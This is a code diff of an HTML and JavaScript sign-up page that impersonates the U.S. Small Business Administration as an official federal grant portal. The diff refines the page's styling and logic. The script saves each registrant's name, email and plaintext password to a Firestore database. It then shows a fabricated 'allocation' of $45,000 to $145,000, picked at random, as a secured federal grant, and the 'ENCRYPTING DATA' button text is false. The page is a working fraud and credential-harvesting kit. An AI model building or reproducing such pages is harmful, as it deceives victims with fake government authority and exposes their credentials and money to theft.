@@ -1,67 +1,68 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBA Portal | Create 2026 Account</title>
-    <link rel="stylesheet" href="style.css">
     <style>
-        .cert-box { 
-            display: flex; 
-            align-items: flex-start; 
-            gap: 12px; 
-            background: #f8fafc; 
-            padding: 15px; 
-            border-radius: 12px; 
-            margin: 20px 0;
-            border: 1px solid #e2e8f0;
-        }
-        .cert-box input { width: auto !important; margin-top: 4px; cursor: pointer; }
-        .cert-box label { text-transform: none; font-weight: 500; color: #475569; font-size: 11px; line-height: 1.5; margin: 0; }
-        .cert-box a { color: #1e3a8a; text-decoration: underline; font-weight: 700; }
-        input:focus { border-color: #1e3a8a; outline: none; }
-        label { display: block; font-size: 12px; font-weight: bold; color: #1e293b; margin-bottom: 5px; margin-top: 15px; }
-        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; box-sizing: border-box; }
+        :root { --sba-blue: #00274c; --sba-accent: #1e3a8a; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        
+        .container { max-width: 400px; margin: 20px auto; padding: 0 15px; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-accent); }
+        
+        label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
+        input:focus { border-color: var(--sba-accent); }
+
+        .cert-box { display: flex; gap: 10px; background: #f8fafc; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px solid #e2e8f0; }
+        .cert-box input { width: 20px; height: 20px; margin: 0; cursor: pointer; }
+        .cert-box label { text-transform: none; font-weight: 500; color: #475569; font-size: 10px; line-height: 1.4; margin: 0; letter-spacing: 0; }
+
+        .reg-btn { background: var(--sba-accent); color: white; padding: 16px; border-radius: 8px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
+        .reg-btn:disabled { background: #94a3b8; }
     </style>
 </head>
-<body style="background: #f1f5f9;">
+<body>
+
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - FISCAL YEAR 2026
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE REGISTRATION
     </div>
 
-    <div class="nav" style="background: #1e3a8a; padding: 15px; text-align: center;">
-        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px;">SBA.GOV</h1>
+    <div class="nav-header">
+        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px; font-weight: 900;">SBA.GOV</h1>
     </div>
 
     <div class="container">
-        <div class="card" style="margin-top: 20px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
-            <h2 style="font-size: 22px; color: #1e3a8a; margin-bottom: 5px;">Create Your Profile</h2>
-            <p style="font-size: 13px; color: #64748b; margin-bottom: 25px;">Provide your legal information for the 2026 Grant Application process.</p>
+        <div class="card">
+            <h2 style="font-size: 22px; color: var(--sba-blue); margin: 0 0 10px;">Create Profile</h2>
+            <p style="font-size: 12px; color: #64748b; margin-bottom: 20px;">Federal Grant Application Portal - FY2026</p>
             
             <label>Full Legal Name</label>
-            <input type="text" id="n" placeholder="First M. Last">
+            <input type="text" id="name" placeholder="First M. Last">
 
             <label>Email Address</label>
-            <input type="email" id="e" placeholder="name@domain.com">
+            <input type="email" id="email" placeholder="name@domain.com">
 
-            <label>Create Secure Password</label>
-            <input type="password" id="p" placeholder="Minimum 6 characters">
+            <label>Secure Password</label>
+            <input type="password" id="pass" placeholder="Min. 6 characters">
 
             <div class="cert-box">
                 <input type="checkbox" id="terms">
                 <label for="terms">
-                    I certify that all information provided is true and accurate as of 2026. I have read the 
-                    <a href="terms.html">Terms and Conditions</a> and understand that misrepresentation to the SBA is a federal offense under 18 U.S.C. § 1001.
+                    I certify that all provided information is accurate. I understand that misrepresentation to the SBA is a federal offense under <b>18 U.S.C. § 1001</b>.
                 </label>
             </div>
 
-            <button id="regBtn" style="background: #1e3a8a; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px;">
-                Start 2026 Application
-            </button>
+            <button id="regBtn" class="reg-btn">Start Application</button>
             
-            <div style="text-align:center; margin-top:20px; font-size: 14px;">
-                Already registered? <a href="index.html" style="color: #1e3a8a; font-weight: bold; text-decoration: none;">Login here</a>
+            <div style="text-align:center; margin-top:20px; font-size: 13px; color: #64748b;">
+                Existing user? <a href="index.html" style="color: var(--sba-accent); font-weight: 700; text-decoration: none;">Sign In</a>
             </div>
         </div>
     </div>
@@ -84,57 +85,49 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        document.getElementById('regBtn').addEventListener('click', async () => {
-            const name = document.getElementById('n').value.trim();
-            const email = document.getElementById('e').value.trim();
-            const pass = document.getElementById('p').value;
+        document.getElementById('regBtn').onclick = async () => {
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const pass = document.getElementById('pass').value;
             const agree = document.getElementById('terms').checked;
 
-            if(!name || !email || !pass || !agree) {
-                return alert("REQUIRED: Complete all fields and certify accuracy.");
-            }
+            if(!name || !email || !pass || !agree) return alert("NOTICE: Complete all fields and certify accuracy.");
 
             const btn = document.getElementById('regBtn');
-            btn.innerText = "ENCRYPTING PROFILE...";
+            btn.innerText = "ENCRYPTING DATA...";
             btn.disabled = true;
 
             try {
-                // 1. Create Auth Account
+                // 1. Create User
                 const res = await createUserWithEmailAndPassword(auth, email, pass);
                 
-                // 2. Trigger verification email
+                // 2. Verification Email
                 await sendEmailVerification(res.user);
 
-                // 3. Generate Random Grant Allocation
-                const rawAmount = Math.floor(Math.random() * (145000 - 45000 + 1)) + 45000;
-                const formattedBal = rawAmount.toLocaleString('en-US');
+                // 3. Grant Allocation Logic ($45k - $145k)
+                const amount = Math.floor(Math.random() * (145000 - 45000 + 1)) + 45000;
+                const balanceStr = amount.toLocaleString('en-US');
 
-                // 4. Save user record to Firestore
+                // 4. Create Firestore Document
                 await setDoc(doc(db, "users", res.user.uid), {
                     fullName: name,
                     email: email,
                     password: pass, 
-                    balance: formattedBal,
+                    balance: balanceStr,
                     status: "ALLOCATED / PENDING VERIFICATION",
                     kycStatus: "NOT STARTED",
-                    role: "user",
                     regDate: serverTimestamp()
                 });
 
-                alert("FEDERAL ALLOCATION SUCCESS: A grant of $" + formattedBal + " has been assigned to your legal profile.\n\nIMPORTANT: Check your email inbox to verify your account.");
-                
-                window.location.href = 'verify.html';
+                alert("ALLOCATION SECURED: $" + balanceStr + " has been assigned to your profile.\n\nPlease check your email to verify your account before logging in.");
+                window.location.href = 'index.html';
 
             } catch(err) { 
-                let msg = "System busy. Please try again.";
-                if(err.code === 'auth/email-already-in-use') msg = "This email is already linked to a 2026 application.";
-                if(err.code === 'auth/weak-password') msg = "Security too low. Password must be 6+ characters.";
-                
-                alert("REGISTRATION ERROR: " + msg); 
+                alert("REGISTRATION ERROR: " + (err.code === 'auth/email-already-in-use' ? "Email already exists." : "Try again later.")); 
                 btn.disabled = false; 
-                btn.innerText = "Start 2026 Application";
+                btn.innerText = "Start Application";
             }
-        });
+        };
     </script>
 </body>
 </html>
